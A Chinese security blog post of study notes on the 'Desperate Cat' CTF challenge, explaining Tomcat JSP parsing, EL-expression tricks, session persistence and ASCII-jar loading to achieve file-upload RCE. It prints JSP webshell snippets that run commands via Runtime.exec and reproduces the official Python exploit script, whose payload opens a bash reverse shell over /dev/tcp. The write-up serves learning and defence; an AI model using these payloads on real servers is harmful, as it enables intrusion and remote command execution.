---
title: 以 Desperate Cat 为始学一些姿势 | 素十八
source: https://su18.org/post/Desperate-Cat/
source_host: su18.org
clip_date: 2026-09-08T18:04:41+08:00
trace_id: 187d2ecb-1ce3-4de9-b460-2b8067f01184
content_hash: 8bc361ec34fc6ebfcfabe887a862ae2ae60b9477688b00cb49f889bd21803d5a
status: synced
tags:
  - CTF
  - Tomcat安全
series: null
feed_source: 素十八 su18
ai_summary: 即使 Tomcat 场景下任意文件上传过滤了关键特殊字符、写入内容带脏数据且按 UTF-8 落地，攻击者仍可通过 EL 表达式篡改配置触发 Session 序列化写 JSP，或构造纯 ASCII Jar 包被 reload 加载后 getshell。
ai_summary_style: key-points
images_status:
  total: 42
  succeeded: 42
  failed_urls: []
notion_page_id: 3d575244-d011-8132-99ed-d262ea77febe
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 即使 Tomcat 场景下任意文件上传过滤了关键特殊字符、写入内容带脏数据且按 UTF-8 落地，攻击者仍可通过 EL 表达式篡改配置触发 Session 序列化写 JSP，或构造纯 ASCII Jar 包被 reload 加载后 getshell。
> 
> - **过滤限制：** 接口取 dir/filename/content 时会 `trim` 并转义 `& < ' > " ( )`，指定 UTF-8 写入，落盘前后附加脏数据；后端不检查后缀与路径，且会用 `mkdirs` 递归创建目录。
> - **JSP 解析特性：** Tomcat 编译 JSP 时支持 Unicode 编码（`\uu...uXXXX` 形式）、多种 BOM 编码、EL 表达式、tag/tagx 与 XML 特殊写法；生成 Java 源码是拼接式，可用前后闭合片段绕过检测。
> - **官方解法：** 不直接写可执行 JSP，而是用 `${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}` 等 EL 表达式，将 Manager.pathname 改为 .jsp、向 Session 写入恶意数据、把 Context.reloadable 设为 true，再上传 jar 到 `/WEB-INF/lib/` 触发 reload/stop，让 Session 持久化机制写出恶意 JSP。
> - **非预期解法：** 利用 Deflate 动态 Huffman 编码并填充垃圾数据，可构造全部字符落在 ASCII 安全区、且不含被过滤符号的合法 zip/jar 包；上传到 lib 目录后配合触发 reload 即可被加载执行。
> - **重载与调用：** Host 默认 autoDeploy 会监视 WatchedResource（如 `conf/context.xml`）变化触发重部署，也可通过创建 `WEB-INF/tomcat-web.xml/` 目录让应用重载；重载后可向 `${applicationScope[param.a]=param.b}` 写入 `org.apache.jasper.compiler.StringInterpreter` 属性触发恶意类实例化，或直接访问 jar 内 `/META-INF/resources/` 下的 Webshell。

## 0x00 前言

以前基本上是不关注 CTF 的，但最近发现很多 CTF 中的小 Tricks 真的很有意思，作者们对一个问题的研究程度真的很深，换做是我可能直接摆烂了，这篇文章中利用到的点又几乎都不会，因此特意写一下学习笔记。

## 0x01 环境准备及分析

官方环境和 WP 被出题人放在了 Github： [https://github.com/voidfyoo/rwctf-4th-desperate-cat](https://github.com/voidfyoo/rwctf-4th-desperate-cat)

在 docker 文件夹下的 `ROOT.war` 即是题目 war 包，题目中使用了 Tomcat 9.0.56 及 jdk 8u311进行环境搭建。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a5fa0c6848e755e0.png)

由于是纯学习，没有参加比赛，且漏洞代码量较少，为了方便调试及查看，这里我选择把代码复制粘贴出来直接起个项目在 IDEA 中 debug。

首先看下项目的代码，比较简单，只有几个关键类。

第一个核心的关键类是 `ExportServlet` ，继承了 `HttpServlet` 并重写了 `doPost` 方法。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/10d48978693ef8e5.png)

这个类首先使用了 `ParamUtil#getParameter` 方法获取三个参数 dir/filename/content，在获取时，使用了 `trim` 方法去除空格，并将 `& < ' > " ( )` 符号进行了转义处理。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e3bebe583193ffbf.png)

然后截取 filename 的后缀，重命名文件，在 content 的前后加入了一些脏数据，并将文件内容使用指定编码 UTF-8 转为字节序列而非使用直接的字节流，然后调用 `this.writeBytesToFile` 将内容写到文件中。这个方法逻辑如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6718794fd01b6b25.png)

可以看到，如果父目录不存在则会进行创建操作，这里使用了 `mkdirs` 函数，因此是支持递归创建目录的。

最后是使用 `this.outputMsg()` 方法将写入文件的绝对路径打印出来。

代码很简单，条件很明确：

1.  程序存在一个任意文件上传接口，对后缀没有检查，对文件落地目录没有检查，会递归创建目录，但是会重命名文件；
2.  中间件是 Tomcat，题目中没有其他的额外限制；
3.  对文件名、插入的目录、文件内容转义了 & 、单双引号、尖括号、圆括号。
4.  文件内容以 UTF-8 编码写入，并且前后有脏数据。

在这样的场景下，如何 getshell ？如何拿到服务器权限？

## 0x02 官方 WP 学习

本部分跟着官方 WP 学一下。

## A. 前情提要

正向情况下的任意文件上传漏洞，落地一个恶意 JSP 就可以了，而这个问题最大的难点就在于程序过滤了太多的关键符号。

那抛开题目本身，在 JSP 的解析过程中，都有哪些 Tricks 可以用呢？这里再来简单回顾一下 JSP 的解析流程（虽然在之前的文章已经回顾了一千遍了，这此细致一点，多贴一点代码）：

1.  `org.apache.jasper.servlet.JspServlet` 处理全部的 JSP 请求，其 `service` 方法调用 `serviceJspFile` 方法处理；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/461c0e51822f60c3.png)

2.  `serviceJspFile` 方法创建 JspServletWrapper 对象作为封装，并调用其 service 方法；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ae258be881cb27d7.png)

3.  该方法里调用 `JspCompilationContext#compile` 方法进行 JSP 的编译；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/de573734653dd4f8.png)

4.  `compile` 方法创建 Compiler 实例，并执行其 compile 方法，Tomcat 对于 Eclipse JDT 和 Ant 这两种编译器都支持，默认使用 JDT；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e6a73f186291778c.png)

5.  继续跟，其实我们知道，Tomcat 先将 JSP 转为 Java，再编译成 class，然后进行加载，这里的方法为 `generateJava` ；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d6c8a9334797e512.png)

6.  `generateJava` 方法中调用 `ParserController#parse` 方法将 jsp 文件解析成为 `pageNodes` ；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1fa6039808c38923.png)

并使用 `org.apache.jasper.compiler.Generator` 将解析的内容转换为 java 源文件；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/275a146c522f062c.png)

7.  在解析 JSP 文件时，首先做的事是解析 JSP 的编码，在 `ParserController#determineSyntaxAndEncoding` 方法中使用了 `org.apache.jasper.compiler.EncodingDetector` 来进行编码的检查和解析；这里发现，tomcat 还支持 `.tag` 和 `.tagx` 的后缀名，用于在 jsp 中进行标签的引入，后面会简单说一下 `tag` 的用法；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bdb94a180f620fe5.png)

编码解析时，可以看到方法取了文件的前四个字节，并使用 `processBom` 方法进行校验；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/13a542a3867ae375.png)

`processBom` 方法里可以看到支持了 `UTF-8` 、 `UTF-16BE` 、 `UTF-16LE` 、 `ISO-10646-UCS-4` 、 `CP037` 多种编码。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/02541b05b3cd1f38.png)

8.  回到 JSP 文件的解析流程中， `ParserController#doParse` 方法调用 `org.apache.jasper.compiler.Parser#parse` 方法进行 JSP 的解析，其中会循环调用解析 `Parser#parseElements` 方法依次解析 JSP 中的代码块；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c52ef53397cd91e4.png)

9.  这个方法是比较重要的方法，根据不同的 JSP 标签写法，使用不同的方法去解析，这里看到有很多常见的 JSP 标签格式，比如最常使用的 `<%` 标签使用 `parseScriptlet` 方法进行处理；除此之外，还发现了以 `${` 或 `#{` 开始的，会调用 `parseELExpression` 方法按照 EL 表达式处理，这里不会直接解析，而是会将其封装为 `org.apache.jasper.compiler.Node` 的不同实现类；

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3b5f258b6ffd4eee.png)

10.  解析完 JSP 中全部的 Node 之后，使用 `org.apache.jasper.compiler.Generator#generate` 方法，将其转换为 `.java` 源代码，并将文件落地到指定特定的目录下。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1678cc8db7cb4b90.png)

这里有一个可以关注的点是，由于 JSP 解析生成 Java 文件采用了类似“字符串拼接”的方式，通过 `generatePreamble` + 解析用户代码 + `generatePostamble` 的顺序，因此也可以通过“前后闭合”的方式来进行一些检测手段的绕过。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fa0a4dff8bf4039a.png)

11.  生成 `.java` 文件后，下一步就是将 java 源代码编译成为 `.class` ，之前说过 Tomcat 默认使用 JDT，因此调用的方法为 `org.apache.jasper.compiler.JDTCompiler#generateClass` 。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/965469c3bbf36670.png)

12.  编译成为 class 的过程，会委托给 `org.eclipse.jdt.internal.compiler.Compiler` 进行处理，这个处理分为多个过程，包括处理类中用的字段、方法、类型等等。我们知道，在 JSP 文件的处理中，用户编写的代码都会被放在 `_jspService` 方法中，因此比较关键的就是对这个方法的处理。调用了 `org.eclipse.jdt.internal.compiler.parser.Parser` 的 `parse` 方法，这个方法会调用 `org.eclipse.jdt.internal.compiler.parser.Scanner` 来对 `.java` 源代码中的字符进行扫描和解析，并进行相关的处理，其中在扫描单字符的 char 的方法 `getNextChar` 中存在如下逻辑：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/027a077010d18410.png)

如果发现了连续的 `\\` 和一个 `u` 字符，将转而调用 `getNextUnicodeChar` 方法进行 Unicode 字符串的解析，也就是说，在编译的过程中支持了对 Unicode 编码的解析，并且在 `getNextUnicodeChar` 方法中写了一个 while 循环来跳过其中的 `u` 字符，也就是说在 Unicode 中这个 `u` 可以重复写若干个。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b10aec1462b78773.png)

更多的解析处理细节位于 `org.eclipse.jdt.internal.compiler.parser.Scanner#getNextToken0` ，这其中还衍生出使用 unicode 换行符 `//\u000d\uabcd` 来逃避一些检测的姿势，感兴趣可以自行查看。

13.  在生成 `.class` 文件后， `JspServletWrapper` 会加载并实例化该类，并调用其 `service` 方法进行请求的处理。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/daf9d0c165618c05.png)

实例化使用了 InstanceManagerFactory ，实际上就是调用 `JasperLoader` 进行 `loadClass` 并 `newInstance` 。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2a99e9b49085dcd9.png)

## B. 思路总结

经过上面对流程的浅析，可以发现在面对 Tomcat 文件上传 JSP 时，大致有如下 tricks：

-   Tomcat 在编译 `.java` 到 `.class` 的过程中支持 unicode 编码，除去标签外，在原本的 JSP 内容中可以使用 `\uXXXX` 格式的 Unicode 编码，并且其中的 `u` 可以无限写多个，例如：
    
    ```java
    <%\uuuuuuuuuuuu0052\u0075\u006e\u0074\uuuuuuuuuuuuuuuuuuuuu0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%>
    ```
    
-   Tomcat 对其处理的 JSP/JSPX 文件及其引用或包含的如 `.tag/.tagx` 文件处理时支持 `UTF-8` 、 `UTF-16BE` 、 `UTF-16LE` 、 `ISO-10646-UCS-4` 、 `CP037` 多种编码，会自动识别文件 BOM 头部进行解析，但同时可以在 `pageEncoding` 中指定文件编码；
    
-   Tomcat 支持 `<%@/<jsp:directive./<jsp:scriptlet` 各种各样的指令、标签解析，其中默认支持了以 `${` 开头的 EL 表达式解析，还支持了 `#{` ，但需要额外开启；
    
-   在面对 JSPX/TAGX 文件时，其文件名代表文件为 XML 格式，在 ParserController 处理时会将 `isXml` 标记为 true， 并按照 XML 格式来进行解析，因此可以使用 XML 解析过程中支持的一些 tricks，例如 HTML 实体编码，CDATA 混淆等等；
    
-   Tomcat 的 `.tag/.tagx` 文件支持动态重载，因此如果环境只对 `jsp` 后缀内容有严格限制，可以将 `.tag/.tagx` 文件落地在 `/WEB-INF/tags` 文件夹下，并在 jsp 中进行调用，例如 tag 文件 `<%java.lang.Runtime.getRuntime().exec("open -a Calculator.app");%>` ，JSP 文件 `<%@ taglib tagdir="/WEB-INF/tags" prefix="a"%><a:su18/>`
    
-   由于 Tomcat 生成 `.java` 是采取“拼接方式”，因此可以使用前后闭合写法，例如如下：
    
    ```java
    <%hack(request.getParameter("cmd"));}catch(Throwable ignored){}}public void hack(String cmd)throws Exception{javax.servlet.jsp.JspWriter out = null;javax.servlet.jsp.JspWriter _jspx_out = null;javax.servlet.jsp.PageContext _jspx_page_context=null;javax.servlet.http.HttpServletResponse response=null;try{java.lang.Runtime.getRuntime().exec(cmd);%>
    ```
    

## C. 回到题目

在总结了部分姿势后回到题目中，由于题目中对 `& < ' > " ( )` 符号进行了过滤，并指定写入文件编码为 UTF-8。因此直接限制了之前总结的绝大部分情况。

看了一下发现只剩下了使用 `${}` 包裹的 EL 表达式可以执行，但同时还限制了不能使用 `()` 。不能使用括号的情况下，就无法通过 EL 表达式调用函数。

作者给出了他的几个思路：

-   **看 Tomcat JSP 中是否支持类似于 EL 这类具有动态执行能力的其他语法特性**：通过跟踪 Tomcat 对 JSP 文件的解析流程，我们知道除了对 EL 表达式的单独处理，Tomcat 支持的其他语法均为对标签、指令等语法的解析，并在处理指定文件时支持 xml 格式的解析，并没有发现对其他动态语言的支持。
-   **看 EL 表达式中是否支持某些特殊编码，利用特殊编码将要转义的字符进行编码来绕过**：在 Tomcat 环境下，程序对 EL 表达式的扫描解析使用了 `org.apache.el.parser.SimpleCharStream` 类进行字符的解析，读取字符使用了 `java.io.StringReader` ，在解析过程中没有见到类似指定字符如 `\\u` 就开始进行 Unicode 字符串的解析的逻辑，在初始化 `SimpleCharStream` 也没有特性支持指定编码的情况，因此感觉这条路也走不通。
-   **看 EL 表达式中是否可能存在二次解析执行**：EL 本身并不支持双写 `${}` 之类的进行二次解析，历史上出现的二次解析都是使用标签库进行的循环解析导致的，而要引入标签库就又需要 `< >` 的加持，不知道有什么姿势可以进行二次解析？
-   **在不使用圆括号的情况下，通过 EL 表达式的取值、赋值特性，获取到某些关键的 Tomcat 对象实例，修改它们的属性，造成危险的影响**：官方 wp ，也是作者针对此问题的思路。

接下来学习作者的解法。

首先来说一下 Tomcat 的 Session 管理机制。在 Tomcat 5.5 版本之后提供了一个接口 `org.apache.catalina.Manager` 用来进行会话的管理。在 Tomcat 设计模式下，管理会话的接口通常被嵌套在 Context 中进行封装调用。如果用户没有自定义的管理器，Tomcat 会创建默认的管理器进行管理，他提供了两个 SessionManager 类，一个是 `org.apache.catalina.session.StandardManager` ，一个是 `org.apache.catalina.session.PersistentManager` ，而Tomcat 默认使用 StandardManager 进行会话的管理。

StandardManager 类提供了 Session 持久化的机制，由于其间接继承了 `LifecycleBase` ，并重写了 `stopInternal()` 方法，因此在终止生命周期时，会对其 `stopInternal()` 方法进行调用，这个方法调用 `unload()` 方法

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/52c00e6b48147979.png)

进一步调用 `doUnload()` 方法。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/00984770fe6b261d.png)

在此方法中，StandardManager 会使用 `this.pathname` 中的值创建 File 对象，默认是 `SESSIONS.ser` ，并以序列化数据的形式，将 Session 对象进行写入。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/64a01c30be14725a.png)

StandardSession 对象的序列化过程会将其 attributes 的键值一一进行序列化。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/57dc4ac81f5dd2ad.png)

相应地，在开始生命周期时，也有对应的反序列化操作，这里不在描述。

也就是说，通过向 Session 中写入属性，可以在容器生命周期变化时，将其中的内容序列化至硬盘文件中。那该如何触发呢？根据 Manager 组件文档，在 Tomcat 正常关闭或重启，或触发了一个应用的 reload 时，会进行序列化操作。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a2641b90c29e8fe7.png)

那么如何在不重启的情况下，触发应用的 reload 呢？

在 Tomcat 启动时，会在组件的生命周期开启时，调用 `ContainerBase#threadStart()` 方法来创建一个后台线程 ContainerBackgroundProcessor。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/40d805e8dbe68f3c.png)

这个线程将会定时（默认为10秒）执行 Engine、Host、Context、Wrapper 各容器组件及与它们相关的其它组件的 `backgroundProcess()` 方法。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/94031cc89c2b6495.png)

代码在 `org.apache.catalina.core.StandardContext#backgroundProcess()` 方法中。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/59e8586df45bca70.png)

其中与自动加载类相关的代码在 loader 的 backgroundProcess 方法的调用时。每一个 StandardContext 会关联一个 loader 变量，该变量的初始化代码在 `org.apache.catalina.core.StandardContext#startInternal()` 方法中：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/16bcaba73e9b96e9.png)

也就是说，程序会调用 `org.apache.catalina.loaderWebappLoader#backgroundProcess()` 方法进行类加载的监控，可以看到，当 `this.reloadable` 为 true 且 `this.modified()` 返回 true 时，会调用 `this.context#reload()` 方法进行重新加载。这里 `this.reloadable` 默认为 false。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4b0a3156632ef839.png)

接下来我们来跟一下 `modified()` 方法，这部分在不同 Tomcat 版本细节上略有差异，但总体的思路就是分成两部分，第一部分检查web 应用中的资源文件（.class 文件）是否有变动，根据文件的最近修改时间来比较，如果有不同则返回 true。第二部分检查 web 应用中的 jar 文件是否有变动，增加、删除和修改都会返回 true。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a1f68e4afe446f53.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/10d52826e8f9d328.png)

如果满足条件，则会触发 `StandardContext#reload()` 方法，这个方法会有调用 `stop` 然后是 `start` 方法进行重新加载。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fbb61aa690966637.png)

在了解了上述两个知识点后，作者的解法的思路就出来了：

-   通过 EL 表达式修改 Session 文件存储路径，改成后缀为 jsp；
-   通过 EL 表达式向 Session 中写入数据，来让序列化后的数据中有恶意 JSP 的代码；
-   通过 EL 表达式将 Context 中的 reloadable 修改为 true；
-   使用任意文件上传，上传一个后缀为 jar 的文件至 `/WEB-INF/lib/` 下，触发 reload，将恶意数据写入；
-   通过 web 应用访问恶意 JSP。

思路已经打通，接下来遇到的最后一个问题就是，如果上传的.jar 文件是不合法的.jar，那么原来的应用在 reload 时就会加载失败，导致访问不到这个应用，前功尽弃。

而此时作者的解决方案是在 reload 之前，通过修改 appBase，将应用的路径修改为上层其它路径，避免访问不到的问题。

至此，官方 writeup 的完整解题思路就已完成，作者通过 EL 表达式在 JSP 中的利用，多次修改关键属性，利用 Session 持久化及 Tomcat 动态重载的功能触发写入恶意文件。

官方脚本如下：

```python
#!/usr/bin/env python3

import sys
import time
import requests

PROXIES = None

if __name__ == '__main__':
    target_url = sys.argv[1]  # e.g. http://47.243.235.228:39465/
    reverse_shell_host = sys.argv[2]
    reverse_shell_port = sys.argv[3]

    el_payload = r"""${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
    ${sessionScope[param.b]=param.c}
    ${pageContext.servletContext.classLoader.resources.context.reloadable=true}
    ${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}"""

    reverse_shell_jsp_payload = r"""<%Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "sh -i >& /dev/tcp/""" + reverse_shell_host + "/" + reverse_shell_port + r""" 0>&1"});%>"""
    r = requests.post(url=f'{target_url}/export', data={'dir': '', 'filename': 'a.jsp', 'content': el_payload, },
                      proxies=PROXIES)

    shell_path = r.text.strip().split('/')[-1]
    shell_url = f'{target_url}/export/{shell_path}'

    r2 = requests.post(url=shell_url,
                       data={'a': '/tmp/session.jsp', 'b': 'voidfyoo', 'c': reverse_shell_jsp_payload, 'd': '/', },
                       proxies=PROXIES)

    r3 = requests.post(url=f'{target_url}/export',
                       data={'dir': './WEB-INF/lib/', 'filename': 'a.jar', 'content': 'a', },
                       proxies=PROXIES)

    time.sleep(10)  # wait a while

    r4 = requests.get(url=f'{target_url}/tmp/session.jsp', proxies=PROXIES)
```

## 0x03 非预期 WP

根据作者的文章，解出此道赛题的两个队伍均上传了一个 ASCII jar 并执行它来解题。之所以作者绕来绕去使用了诸多特性，最后写入了 JSP，主要是因为有两个原因：

-   写入数据的前后有脏数据；
-   程序以 UTF-8 字符串获取传入参数并写入，而非流、字节。

有了这个限制，直接上传一个 Jar 包去加载执行似乎是不可能的？

## A. Jar 包上传

首先来看下，什么是 Jar？根据官方文档 [JAR File Specification](https://docs.oracle.com/javase/6/docs/technotes/guides/jar/jar.html) ，一个 Jar 文件就是带有可选的 META-INF 目录的 zip 文件。

这部分之前还没关注过，只知道 jar 文件能解压，没想到压根就是 ZIP 格式。为了验证这个说法，我将一个编译好的 class 文件打包成为 zip，并手动将其后缀修改为 jar，然后使用 URLClassLoader 去加载这个类，结果发现可以正常使用。

所以说，这题的非预期解法的重点，就是构造一个全部字符都在 0x00-0x7F 之间且不包括 `& < ' > " ( )` 字符的 ASCII Jar 包。

这里作者引用了 @molnar_g 在 8 年前的 ascii-zip 项目，该项目被用在构造 ASCII Flash Files 上。项目的主要 tricks 点在于 Deflated 压缩算法，由于 Deflated 支持预定义的 Huffman 编码块（静态 Huffman 编码） 以及具有明确定义字典的 Huffman 编码块（动态 Huffman 编码）。 molnar 利用动态 Huffman 编码，在经过计算后，通过人工构造 LZ 解码所需要的两张 Huffman 码表，使得两张码表以及压缩数据均可以落在 ASCII 的范围中。

这部分涉及较多的知识及计算，实在是有些超出能力范围，项目在 Youtube 上有一个解说视频，感兴趣的朋友可以看本文参考链接里面的相关内容。

在这个项目的基础上，接下来考虑的就是 Jar 格式的问题，之前提到 Jar 就是 ZIP，而 ZIP 文件格式支持 Deflated 压缩算法，并在 Deflate 压缩码流外面套了一层文件相关的信息。在已经解决 Deflate 压缩数据的 ASCII 问题，接下来就是解决将 ZIP 封装的相关数据落在 ASCII 范围中的问题。

在 ZIP 封装过程中，除去一些魔数、标识位、并不重要的信息、不是必要存在的数据块，还必须要落在 ASCII 范围内的数据有：

-   CRC 32 校验码；
-   压缩后大小；
-   未压缩大小；
-   文件名；
-   文件名长度。

这里由于 c0ny1 师傅已经给出了他的解法，而我这里只是学习，没有新的实现方式，因此这里不再复制粘贴，大家可以查看 [此篇文章](https://gv7.me/articles/2022/rwctf-4th-desperate-cat-ascii-jar-writeup/) 。

思路就是通过向恶意类中不断填充垃圾数据，并编译成为 class 进行打包，检验字符范围直到满足条件为止。

而且 zip 格式的文件都是支持前后加脏数据的，满足题目的情况。c0ny1 师傅引用了 phith0n 师傅的 PaddingZip 项目来解决此问题。

## B. 动态重载

上传 Jar 后接下来就是加载的问题。

非预期解的两支队伍使用了 Tomcat Context WatchedResource 机制来触发重载，在 `$TOMCAT_HOME$/conf/context.xml` 文件配置下，记录了一些配置文件路径。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e40f42d236587968.png)

这些文件会受到监控，如果修改，则应用程序会触发重新加载。这部分的逻辑在 `org.apache.catalina.startup.HostConfig` 中，这个类注册了一个生命周期事件，用来监视资源文件。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/496125d93edca949.png)

如果 Host 开启 autoDeploy（默认为 true），则会进行检查。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7c905fc23fbdcb0c.png)

最后到了 `org.apache.catalina.startup.HostConfig#checkResources` 方法中，如果有变动或更新，则会重新部署 app。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/819f8547577bcc7a.png)

这里作者还提到，由于应用本身没有 `WEB-INF/tomcat-web.xml` 配置文件， 因此通过利用程序本身的写文件漏洞，来创建一个 `WEB-INF/tomcat-web.xml/` 目录，也可以让应用强行触发 reload，加载进先前写入的 Jar 包。

## C. 调用

加载后，下一个阶段就是调用。这里又出现了一个黑科技，那就是利用 `${applicationScope[param.a]=param.b}` ，向 Context 中写入 `org.apache.jasper.compiler.StringInterpreter` 属性，这个写入的属性在下一次 jsp 解析时，会触发类加载，完成调用。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/168115be6e046847.png)

在解析 JSP 的过程中创建 Generator 实例时，会根据 Context 中创建 StringInterpreter 实例，此处会触发关键类的实例化。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b24593b9ad411b99.png)

除了写入恶意类调用，另外一个队伍将 JSP Webshell 放在先前构造的 Jar 包里的 `META-INF/resources/` 目录直接访问。这是利用了在 Servlet 3.0 协议规范中，包含在 Jar 文件 `/META-INF/resources/` 路径下的资源可以直接被 web 访问的特性。

## 0x04 总结

在本文中，随着这道 CTF 题目，我们发散性地一起学习了如下几个知识点：

-   Tomcat 解析 JSP 的完整过程，及一些细节，并总结了一些 Tricks；
-   Tomcat 的 Session 持久化机制；
-   Tomcat 自动加载类及检测文件变动原理；
-   Jar 文件格式定义，如何生成一个 ASCII JAR；
-   Tomcat Context WatchedResource 机制；
-   利用属性进行类加载小技巧。

不见得以后能用得上，但学习和探究的过程，是非常有趣的旅程。

同时我们也发现，很多你以为一定解决不了的问题，不见得真的解决不了，只是看你是否放弃的那么容易。

## 0x05 其他

由于种种原因，本文是在业余时间进行学习和编纂，在长达至少3个月的编撰过程中，中间又有几篇技术相应的文章或分享在网上公布，考虑到行文通顺的问题，没有强行加在本篇文章中，但是也有所相关，所以就额外提取出来，感兴趣的是否可以进行查看。

关于更多的 Webshell 编码技巧和细节，可以查看 Y4tacker 在跳跳糖发表的文章 [浅谈JspWebshell之编码](https://tttang.com/archive/1840/) 。

关于 Webshell 绕过与查杀的思路，可以查看 yzddMr6 在 2022 补天白帽大会上分享的《Java Webshell攻防下的黑魔法》。
